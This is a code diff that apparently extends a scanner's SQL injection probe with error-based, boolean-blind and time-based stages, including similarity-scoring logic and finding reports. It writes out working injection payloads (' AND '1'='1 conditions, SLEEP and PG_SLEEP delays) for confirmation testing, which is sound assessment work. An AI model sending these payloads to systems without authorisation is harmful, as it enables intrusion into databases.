@@ -22,8 +22,10 @@ offline with crafted responses — no live target needed to prove correctness.
 from __future__ import annotations
 
 import asyncio
+import difflib
 import json
 import logging
+import time
 import uuid
 from dataclasses import dataclass, field
 from typing import Awaitable, Callable, Optional, Protocol
@@ -374,17 +376,84 @@ _SQL_ERROR_SIGNS = (
     "microsoft ole db provider", "jdbc", "warning: mysql",
 )
 
+# ── blind-SQLi oracles (pure, unit-testable) ─────────────────────────
+_CMP_CAP = 40000           # cap body length before similarity comparison (perf)
+
+
+def _ratio(a: str, b: str) -> float:
+    """Similarity of two response bodies in [0,1], length-capped for speed."""
+    return difflib.SequenceMatcher(None, (a or "")[:_CMP_CAP], (b or "")[:_CMP_CAP]).ratio()
+
+
+def boolean_blind_confirmed(baseline: str, t_a: str, f_a: str, t_b: str, f_b: str) -> tuple[bool, dict]:
+    """Decide whether a boolean-blind SQLi oracle fired, from a baseline and two
+    independent TRUE/FALSE payload pairs (A and B, using different constants).
+
+    The injectable signature is: both TRUE responses track the normal page and
+    agree with each other; both FALSE responses diverge from the page and agree
+    with each other; TRUE and FALSE clearly differ. Requiring the pattern to
+    REPLICATE across two different constant pairs defeats pages that merely vary
+    naturally (ads, tokens, timestamps) - the single biggest false-positive
+    source for differential oracles. Thresholds are deliberately conservative:
+    we would rather miss a borderline case than cry wolf.
+    """
+    if not baseline or len(baseline) < 24:
+        return False, {"reason": "baseline too small/empty to judge"}
+    r_true_base = min(_ratio(baseline, t_a), _ratio(baseline, t_b))   # TRUE ~ page  (want high)
+    r_false_base = max(_ratio(baseline, f_a), _ratio(baseline, f_b))  # FALSE ~ page
+    r_true_true = _ratio(t_a, t_b)                                    # trues agree  (want high)
+    r_false_false = _ratio(f_a, f_b)                                  # falses agree (want high)
+    r_true_false = max(_ratio(t_a, f_a), _ratio(t_b, f_b))            # T vs F       (want < within-group)
+    # The decisive signal: the cross-group (TRUE vs FALSE) difference must exceed
+    # the within-group noise (how much TRUEs/FALSEs differ among themselves). A
+    # static page has zero cross-group difference; a volatile page (nonce,
+    # timestamp) has within-group noise as large as any cross-group gap, so it
+    # fails too. Only a genuine, consistent boolean split clears GAP.
+    within_group = min(r_true_true, r_false_false)
+    gap = within_group - r_true_false
+    metrics = {
+        "true~baseline": round(r_true_base, 3), "false~baseline": round(r_false_base, 3),
+        "true~true": round(r_true_true, 3), "false~false": round(r_false_false, 3),
+        "true~false": round(r_true_false, 3), "gap": round(gap, 3),
+    }
+    _GAP = 0.02
+    confirmed = (
+        r_true_base >= 0.90 and          # TRUE resembles the real page
+        r_true_true >= 0.95 and          # the two TRUEs agree (not a volatile/noisy page)
+        r_false_false >= 0.95 and        # the two FALSEs agree (not a volatile/noisy page)
+        gap >= _GAP                      # TRUE vs FALSE differ by more than within-group noise
+    )
+    return confirmed, metrics
+
+
+# Conditional time-delay payloads. SLEEP/pg_sleep are READ-ONLY (no data change);
+# the conditional only decides whether to wait, so this is a timing oracle, not a
+# destructive action. Kept to the two most common engines and a modest delay.
+def _time_payloads(delay: int) -> list[tuple[str, str]]:
+    return [
+        ("mysql/mariadb", f"' AND SLEEP({delay})-- -"),
+        ("postgres",      f"' AND {delay}=(SELECT {delay} FROM PG_SLEEP({delay}))-- -"),
+        ("mysql-numeric", f" AND SLEEP({delay})-- -"),
+    ]
+
 
 class InjectionProbeExecutor:
-    """Injection confirmation via differential error-signature (CWE-89 family).
+    """SQL injection confirmation (CWE-89), escalating through non-destructive
+    oracles until one fires - or none do:
 
-    For each recon-observed injectable parameter, send a benign baseline value
-    and then the same value with a single appended quote ("'") - an inert,
-    non-destructive, GET-only probe. If a database error signature appears in
-    the quoted response but NOT in the baseline, the input is reaching a SQL
-    interpreter unsanitized: a confirmed injection point, shown by behavior, not
-    by a guessed payload. No UNION/stacked/boolean exfiltration is attempted and
-    nothing state-changing is sent.
+      1. Error-based: append a single quote; a DB error that the baseline lacks
+         proves input reaches a SQL interpreter.
+      2. Boolean-blind: send TRUE vs FALSE conditions (two constant pairs); if
+         TRUE tracks the page and FALSE diverges, consistently, the query result
+         is attacker-controllable even with errors suppressed.
+      3. Time-based: a conditional SLEEP/pg_sleep; a response that is reliably
+         slower (confirmed on repeat, against a fast control) proves injection
+         when there is no visible output difference at all.
+
+    All three are GET-only and non-destructive: inert quote, read-only boolean
+    conditions, read-only timing functions. No UNION/stacked/exfiltration or
+    state-changing payload is ever sent. Each confirmed finding carries two
+    independent evidence types for the validation pipeline to adjudicate.
     """
 
     handles = {HypothesisKind.INJECTION}
@@ -401,46 +470,48 @@ class InjectionProbeExecutor:
             for param in hyp.target_params:
                 if probed >= ctx.max_probes:
                     break
-                token = "h4ckb0t" + uuid.uuid4().hex[:8]
-                baseline_url = _with_param(base, path, param, token)        # benign
-                probe_url = _with_param(base, path, param, token + "'")     # one inert quote
-                try:
-                    baseline = await ctx.fetch(baseline_url)
-                    await asyncio.sleep(ctx.pace_seconds)
-                    probe = await ctx.fetch(probe_url)
-                except Exception as e:  # noqa: BLE001
-                    logger.info("injection: fetch failed %s: %s", probe_url, e)
-                    continue
                 probed += 1
-                await asyncio.sleep(ctx.pace_seconds)
-                f = self._evaluate(path, param, baseline, probe, ctx)
+                try:
+                    f = await self._probe_param(path, param, base, ctx)
+                except Exception as e:  # noqa: BLE001
+                    logger.info("injection: probe failed %s?%s: %s", path, param, e)
+                    continue
                 if f is not None:
-                    findings.append(f)
+                    findings.append(f)   # first oracle to fire per param wins; no double-report
         return findings
 
-    def _evaluate(self, path, param, baseline, probe, ctx) -> Optional[Finding]:
-        pb = (probe.text or "").lower()
-        bb = (baseline.text or "").lower()
-        hit = next((s for s in _SQL_ERROR_SIGNS if s in pb and s not in bb), None)
-        if hit is None:
-            # No new error surfaced from the quote -> no evidence of a SQL sink.
-            return None
+    async def _probe_param(self, path, param, base, ctx) -> Optional[Finding]:
+        token = "h4ckb0t" + uuid.uuid4().hex[:8]
+        # ---- 1. error-based (reuse the benign baseline for the boolean stage) ----
+        baseline_url = _with_param(base, path, param, token)
+        quote_url = _with_param(base, path, param, token + "'")
+        baseline = await ctx.fetch(baseline_url)
+        await asyncio.sleep(ctx.pace_seconds)
+        quote = await ctx.fetch(quote_url)
+        await asyncio.sleep(ctx.pace_seconds)
+        f = self._evaluate_error(path, param, baseline, quote, ctx)
+        if f is not None:
+            return f
+        # ---- 2. boolean-blind ----
+        f = await self._evaluate_boolean(path, param, base, baseline, ctx)
+        if f is not None:
+            return f
+        # ---- 3. time-based ----
+        return await self._evaluate_time(path, param, base, ctx)
 
+    # ---- shared finding builder -------------------------------------
+    def _mk_finding(self, path, param, ctx, *, variant, base_score, description,
+                    tx_preview, diff_preview) -> Finding:
         asset = Asset(asset_id="a0", name=ctx.target_host, asset_type="web",
                       scope_approved=True, metadata={"exposure": "internet"})
         finding = Finding(
             finding_id=str(uuid.uuid4()),
-            title=f"SQL injection via '{param}' on {path}",
-            description=(
-                f"Appending a single quote to parameter '{param}' on {path} produced a database "
-                f"error ('{hit}') that the benign baseline did not. Input is reaching a SQL "
-                "interpreter without proper parameterization. Confirmed with an inert quote probe "
-                "(GET, read-only); no data-exfiltration or state-changing payload was sent."
-            ),
+            title=f"SQL injection via '{param}' on {path} ({variant})",
+            description=description,
             asset=asset,
             module_source="injection_executor",
             finding_kind=FindingKind.VULNERABILITY,
-            cvss=CvssScore(base_score=8.6,
+            cvss=CvssScore(base_score=base_score,
                            vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"),
             cwe=WeaknessRef(cwe_id="CWE-89", name="SQL Injection"),
             mitre_techniques=[MitreTechnique(technique_id="T1190", tactic="initial-access",
@@ -452,30 +523,139 @@ class InjectionProbeExecutor:
             ),
             business_impact="An attacker could read or alter database contents, potentially exfiltrating all records.",
         )
+        finding.add_evidence(Evidence.new(
+            evidence_type=EvidenceType.HTTP_TRANSACTION, raw_bytes=tx_preview.encode(),
+            storage_ref=f"mem://inj/{uuid.uuid4().hex[:8]}",
+            description=f"SQLi {variant} probe on {path}?{param}",
+            metadata={"preview": tx_preview},
+        ))
+        finding.add_evidence(Evidence.new(
+            evidence_type=EvidenceType.BEHAVIORAL_DIFF, raw_bytes=diff_preview.encode(),
+            storage_ref=f"mem://inj-diff/{uuid.uuid4().hex[:8]}",
+            description=f"SQLi {variant} differential on {path}?{param}",
+            metadata={"preview": diff_preview},
+        ))
+        logger.info("injection: potential finding on %s?%s (%s)", path, param, variant)
+        return finding
+
+    # ---- 1. error-based ---------------------------------------------
+    def _evaluate_error(self, path, param, baseline, probe, ctx) -> Optional[Finding]:
+        pb = (probe.text or "").lower()
+        bb = (baseline.text or "").lower()
+        hit = next((s for s in _SQL_ERROR_SIGNS if s in pb and s not in bb), None)
+        if hit is None:
+            return None
         tx = (f"GET {probe.url}\nstatus: {probe.status}\n"
               f"DB error signature '{hit}' surfaced:\n{_snippet(pb, hit)}")
-        finding.add_evidence(Evidence.new(
-            evidence_type=EvidenceType.HTTP_TRANSACTION,
-            raw_bytes=tx.encode(),
-            storage_ref=f"mem://inj/{uuid.uuid4().hex[:8]}",
-            description=f"Quote probe eliciting DB error on {path}?{param}",
-            metadata={"preview": tx},
-        ))
         diff = (
             f"Error-signature behavior for parameter '{param}' on {path}:\n"
             f"  baseline (benign value) -> '{hit}' present: False\n"
             f"  probe (value + \"'\")     -> '{hit}' present: True\n"
             "A DB error appeared only when the quote was added, indicating unsanitized SQL interpolation."
         )
-        finding.add_evidence(Evidence.new(
-            evidence_type=EvidenceType.BEHAVIORAL_DIFF,
-            raw_bytes=diff.encode(),
-            storage_ref=f"mem://inj-diff/{uuid.uuid4().hex[:8]}",
-            description="Baseline-vs-probe error-signature difference",
-            metadata={"preview": diff},
-        ))
-        logger.info("injection: potential finding on %s?%s (signature '%s')", path, param, hit)
-        return finding
+        return self._mk_finding(
+            path, param, ctx, variant="error-based", base_score=8.6,
+            description=(
+                f"Appending a single quote to parameter '{param}' on {path} produced a database "
+                f"error ('{hit}') that the benign baseline did not. Input is reaching a SQL "
+                "interpreter without proper parameterization. Confirmed with an inert quote probe "
+                "(GET, read-only); no data-exfiltration or state-changing payload was sent."
+            ),
+            tx_preview=tx, diff_preview=diff,
+        )
+
+    # ---- 2. boolean-blind -------------------------------------------
+    async def _evaluate_boolean(self, path, param, base, baseline, ctx) -> Optional[Finding]:
+        base_body = baseline.text or ""
+        if len(base_body) < 24:
+            return None  # nothing stable to differentiate against
+        pairs = [("' AND '1'='1", "' AND '1'='2"), ("' AND '7'='7", "' AND '7'='8")]
+        resp: list[FetchResult] = []
+        for t_payload, f_payload in pairs:
+            for payload in (t_payload, f_payload):
+                url = _with_param(base, path, param, "h4ckb0t" + payload)
+                resp.append(await ctx.fetch(url))
+                await asyncio.sleep(ctx.pace_seconds)
+        t_a, f_a, t_b, f_b = resp[0].text or "", resp[1].text or "", resp[2].text or "", resp[3].text or ""
+        confirmed, metrics = boolean_blind_confirmed(base_body, t_a, f_a, t_b, f_b)
+        if not confirmed:
+            return None
+        tx = (f"GET {resp[0].url}  (TRUE  ' AND '1'='1)  -> status {resp[0].status}, len {len(t_a)}\n"
+              f"GET {resp[1].url}  (FALSE ' AND '1'='2)  -> status {resp[1].status}, len {len(f_a)}\n"
+              "TRUE condition rendered the normal page; FALSE condition did not.")
+        diff = (
+            f"Boolean-blind differential for parameter '{param}' on {path} "
+            "(two independent constant pairs, must agree):\n"
+            f"  similarity TRUE~baseline : {metrics['true~baseline']} (high = TRUE is the real page)\n"
+            f"  similarity FALSE~baseline: {metrics['false~baseline']} (low  = FALSE diverges)\n"
+            f"  TRUE~TRUE agreement      : {metrics['true~true']}\n"
+            f"  FALSE~FALSE agreement    : {metrics['false~false']}\n"
+            f"  TRUE~FALSE               : {metrics['true~false']} (low = conditions change the result)\n"
+            "The result set tracks an attacker-controlled boolean condition with errors suppressed."
+        )
+        return self._mk_finding(
+            path, param, ctx, variant="boolean-blind", base_score=8.6,
+            description=(
+                f"Parameter '{param}' on {path} is boolean-blind SQL-injectable: a TRUE condition "
+                "(' AND '1'='1) returned the normal page while a FALSE condition (' AND '1'='2) "
+                "returned a materially different page, and the pattern replicated with a second "
+                "constant pair - so the SQL result set follows an attacker-controlled boolean even "
+                "though no database error is shown. Confirmed read-only (GET) with inert boolean "
+                "conditions; no data was read out or modified."
+            ),
+            tx_preview=tx, diff_preview=diff,
+        )
+
+    # ---- 3. time-based ----------------------------------------------
+    async def _evaluate_time(self, path, param, base, ctx) -> Optional[Finding]:
+        delay = 4
+        # Fast control: a benign value should return quickly.
+        control_url = _with_param(base, path, param, "h4ckb0t" + uuid.uuid4().hex[:6])
+        try:
+            control_dt = await self._timed_fetch(control_url, ctx)
+        except Exception:  # noqa: BLE001
+            return None
+        await asyncio.sleep(ctx.pace_seconds)
+        for engine, payload in _time_payloads(delay):
+            url = _with_param(base, path, param, "h4ckb0t" + payload)
+            d1 = await self._timed_fetch(url, ctx)
+            await asyncio.sleep(ctx.pace_seconds)
+            # Require the delay to clearly exceed the control AND the threshold.
+            if d1 < max(delay * 0.7, control_dt + delay * 0.6):
+                continue
+            # Confirm on repeat so a one-off slow response (GC, network) can't pass.
+            d2 = await self._timed_fetch(url, ctx)
+            await asyncio.sleep(ctx.pace_seconds)
+            if d2 < max(delay * 0.7, control_dt + delay * 0.6):
+                continue
+            tx = (f"GET {url}\nconditional {engine} time payload (SLEEP {delay}s), read-only.\n"
+                  f"control response: {control_dt:.2f}s\ndelayed responses: {d1:.2f}s, {d2:.2f}s")
+            diff = (
+                f"Time-based differential for parameter '{param}' on {path} ({engine}):\n"
+                f"  control (benign)      -> {control_dt:.2f}s\n"
+                f"  SLEEP({delay}) probe #1 -> {d1:.2f}s\n"
+                f"  SLEEP({delay}) probe #2 -> {d2:.2f}s\n"
+                f"Both conditional-delay probes added ~{delay}s over the control, confirmed on repeat - "
+                "the server executes an attacker-controlled timing condition."
+            )
+            return self._mk_finding(
+                path, param, ctx, variant="time-based blind", base_score=8.6,
+                description=(
+                    f"Parameter '{param}' on {path} is time-based-blind SQL-injectable: a conditional "
+                    f"read-only delay ({engine} SLEEP {delay}s) made the response reliably ~{delay}s "
+                    "slower than a benign control, confirmed on repeat. The server evaluates an "
+                    "attacker-controlled SQL timing condition even with no visible output difference. "
+                    "Non-destructive: SLEEP/pg_sleep change no data; no exfiltration payload was sent."
+                ),
+                tx_preview=tx, diff_preview=diff,
+            )
+        return None
+
+    async def _timed_fetch(self, url, ctx) -> float:
+        """GET `url` and return elapsed seconds (for the timing oracle)."""
+        t0 = time.monotonic()
+        await ctx.fetch(url)
+        return time.monotonic() - t0
 
 
 class SsrfOobExecutor:
